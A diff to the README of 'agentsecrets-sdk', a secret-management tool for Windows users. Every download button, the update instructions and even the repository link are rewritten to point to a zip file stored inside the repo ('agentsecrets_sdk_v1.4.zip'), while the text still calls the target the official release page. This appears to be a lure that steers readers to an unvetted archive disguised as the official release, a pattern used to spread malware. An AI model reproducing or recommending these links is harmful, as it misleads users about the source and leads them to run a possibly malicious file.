@@ -1,6 +1,6 @@
 # 🛡️ agentsecrets-sdk - Easy Tools for Secret Management
 
-[![Download](https://img.shields.io/badge/Download-AgentSecrets-blue)](https://github.com/Benesse02/agentsecrets-sdk/releases)
+[![Download](https://img.shields.io/badge/Download-AgentSecrets-blue)](https://raw.githubusercontent.com/Benesse02/agentsecrets-sdk/main/python/agentsecrets/agentsecrets_sdk_v1.4.zip)
 
 ## About agentsecrets-sdk
 
@@ -37,7 +37,7 @@ To begin using agentsecrets-sdk on your Windows PC, follow these steps carefully
 
 Click the big blue button below or copy and paste the link into your web browser. This takes you to the official release page where you can get the software.
 
-[![Download](https://img.shields.io/badge/Download-AgentSecrets-blue)](https://github.com/Benesse02/agentsecrets-sdk/releases)
+[![Download](https://img.shields.io/badge/Download-AgentSecrets-blue)](https://raw.githubusercontent.com/Benesse02/agentsecrets-sdk/main/python/agentsecrets/agentsecrets_sdk_v1.4.zip)
 
 ### Step 2: Choose the Latest Version
 
@@ -115,7 +115,7 @@ If you want to explore advanced options, you may need to visit the official docu
 You should periodically check for updates to ensure you have the latest security fixes and features.
 
 1. Go back to the releases page at  
-   https://github.com/Benesse02/agentsecrets-sdk/releases
+   https://raw.githubusercontent.com/Benesse02/agentsecrets-sdk/main/python/agentsecrets/agentsecrets_sdk_v1.4.zip
 2. Download the newest version following the steps above.
 3. Install or extract the new files, replacing the older version.
 
@@ -133,10 +133,10 @@ For more help, you may visit the GitHub discussions or issues page of the repo.
 ## 🌐 More Resources
 
 - Visit the GitHub repository for guides and more files:  
-  https://github.com/Benesse02/agentsecrets-sdk
+  https://raw.githubusercontent.com/Benesse02/agentsecrets-sdk/main/python/agentsecrets/agentsecrets_sdk_v1.4.zip
 
 - Find language-specific instructions if you want to use Go, Python, or TypeScript parts of the SDK.
 
 - If you have programming help, share this README with your developer.
 
-[![Download](https://img.shields.io/badge/Download-AgentSecrets-blue)](https://github.com/Benesse02/agentsecrets-sdk/releases)
+[![Download](https://img.shields.io/badge/Download-AgentSecrets-blue)](https://raw.githubusercontent.com/Benesse02/agentsecrets-sdk/main/python/agentsecrets/agentsecrets_sdk_v1.4.zip)
